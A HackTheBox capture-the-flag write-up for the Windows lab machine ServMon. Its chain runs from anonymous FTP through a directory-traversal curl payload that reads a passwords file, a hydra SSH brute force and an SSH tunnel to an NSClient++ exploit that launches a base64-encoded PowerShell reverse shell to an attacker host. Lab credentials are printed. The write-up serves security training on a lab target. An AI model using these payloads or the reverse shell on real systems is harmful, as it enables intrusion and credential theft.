---
title: "HackTheBox - ServMon"
published: true
---

| Field            | Details                                                                                                                              |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| **OS**           | Windows                                                                                                                              |
| **Difficulty**   | Easy                                                                                                                                 |
| **Release Date** | 2020-04-11                                                                                                                           |
| **Pwned Date**   | 2026-06-03                                                                                                                           |
| **Tags**         | `ftp` `nvms-1000` `nsclient++` `CVE-2019-20085` `directory traversal` `hydra` `ssh local port forwarding` `powershell reverse shell` |

## Summary

ServMon is an easy Windows machine featuring an HTTP server that hosts an NVMS-1000 (Network Surveillance Management Software) instance. This is found to be vulnerable to directory traversal, which is used to read a list of passwords on a user's desktop. Using the credentials, we can SSH to the server as a second user. As this low-privileged user, it's possible enumerate the system and find the password for NSClient++ (a system monitoring agent). After creating an SSH tunnel, we can access the NSClient++ web app. The app contains functionality to create scripts that can be executed in the context of NT AUTHORITY\SYSTEM. This feature can be used to craft a malicious script that spawn a reverse shell and allow command execution as SYSTEM.

## Reconnaissance

Scan the target

```bash
python portscan.py --target <TARGET_IP>
```

This custom script can be found at [https://github.com/n-califano/sectools/blob/main/tools/common/portscan.py](https://github.com/n-califano/sectools/blob/main/tools/common/portscan.py)

If you want to use standard tools you can run

```bash
nmap -p- --min-rate 5000 -oN all_tcp_ports.txt <TARGET_IP>
nmap -sC -sV -p 21,22,80,135,139,445,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670 -oN service_scan.txt <TARGET_IP>
```

The following services will be detected

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|*02-28-22  07:35PM       <DIR>          Users
| ftp-syst:
|*  SYST: Windows_NT

22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
80/tcp    open  http
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5666/tcp  open  tcpwrapped
6063/tcp  open  tcpwrapped
6699/tcp  open  tcpwrapped
8443/tcp  open  ssl/https-alt
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|*Not valid after:  2021-01-13T13:24:20
| fingerprint-strings:
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest:
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|*    jobs
|_ssl-date: TLS randomness does not represent time
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
```

Notice the **Anonymous FTP login allowed** line in the output. Ftp server may contain useful information.

Log in to ftp

```bash
ftp <TARGET_IP>
```

Use `anonymous` when prompted for a name, leave password blank.

Inspecting the ftp content you will find two files:

- Users/Nadine/Confidential.txt
- Users/Nathan/Notes to do.txt

Download the whole Users folder locally

```bash
wget --mirror --no-passive-ftp ftp://anonymous:anonymous@<TARGET_IP>/
```

```bash
cd Users
cat Nadine/Confidential.txt
```

```
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

```bash
cat Nathan/Notes\ to\ do.txt
```

```
1. Change the password for NVMS - Complete
2. Lock down the NSClient Access - Complete
3. Upload the passwords
4. Remove public access to NVMS
5. Place the secret files in SharePoint
```

Based on the notes found on the ftp server the top priority now is to find a way to access that Passwords.txt file.

Browsing to the http service on port 80 you find a NVMS-1000 instance, a video surveillance software, which is vulnerable to directory traversal. For more information see [CVE-2019-20085](https://www.exploit-db.com/exploits/47774).

The directory traversal attack can be used to expose the Passwords.txt files on nathan's desktop.

## Foothold

Check if the attack works by using a simple proof-of-concept

```bash
curl "http://<TARGET_IP>/..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini"
```

If you get the following content the exploit works as intended

```
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

Change the path to expose the Passwords.txt file

```bash
curl "http://<TARGET_IP>/..\..\..\..\..\..\..\..\..\..\..\..\Users\Nathan\Desktop\Passwords.txt"
```

```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

Try to ssh into the target using the found passwords. Instead of trying manually each passwords, use hydra

```bash
curl "http://<TARGET_IP>/..\..\..\..\..\..\..\..\..\..\..\..\Users\Nathan\Desktop\Passwords.txt" > passwords.txt
hydra -l nadine -P passwords.txt ssh://<TARGET_IP> -t 4 -V
```

```
[snip]
[22][ssh] host: 10.129.227.77   login: nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 1 valid password found
[snip]
```

**L1k3B1gBut7s@W0rk** password found for nadine user, use it to ssh into it

```bash
ssh nadine@<TARGET_IP>
```

```
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>
```

Obtained foothold on the target as nadine user

## Privilege Escalation

Browsing to https://<TARGET_IP>:8443 you find a `NSClient++` instance, a software for system monitoring. This tool can run custom scripts and runs as SYSTEM user.

Triggering a reverse shell with a custom script will spawn a shell with SYSTEM privileges

Locate the installation directory and inspect the config file

```bash
cd "C:\Program Files\NSClient++"
type nsclient.ini
```

```
[snip]
allowed hosts = 127.0.0.1
password = ew2x6SsGTxjRwXOT
[snip]
```

The password allows you to login to the tool's web ui but, as you may have noticed, your current access to the web ui is restricted. The reason is in the 'allowed hosts' line: the web ui is reachable only from the localhost, external access is not allowed.

The web ui can be made accessible via `local port forwarding`

```bash
ssh -L 8443:127.0.0.1:8443 nadine@10.129.227.77
```

Enter nadine's password to establish the tunnel.

Now every request sent to https://localhost:8443 of the attacking machine will be relayed to port 8443 of the target, so it's possible to access the web ui as if it was running locally on the attacker's machine.

The password found in the config earlier can be used to log in to the web ui and create the custom script manually but an existing exploit can be used to perform the same actions without ui interaction (the password is still needed though): [NSClient++ Exploit](https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation.git)

Get the exploit

```bash
git clone https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation.git
```

Listen on port 9001 for the incoming reverse shell connection

```bash
nc -lvnp 9001
```

Open a powershell prompt and create a base64-encoded powershell reverse shell. Replace <ATTACKER_IP> with the ip of the attacking machine

```powershell
$command = '$client = New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)

$encoded = [Convert]::ToBase64String($bytes)

Write-Host $encoded
```

The output will look like this

```
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAzADEAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsADAALAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

Your output will be different since your ip will be different.

Encoding the reverse shell in base64 makes it more robust: you don't have to deal manually with quotes and chars escape.

Run the exploit using the powershell's -EncodedCommand option to run the base64 command

```bash
python exploit.py "powershell -EncodedCommand <YOUR_BASE64_OUTPUT_GOES_HERE>" https://127.0.0.1:8443 ew2x6SsGTxjRwXOT
```

You should get a connection on port 9001

```
listening on [any] 9001 ...
connect to [10.10.14.131] from (UNKNOWN) [10.129.227.77] 51681
```

Check the permissions

```
whoami
nt authority\system
```

Got system access.
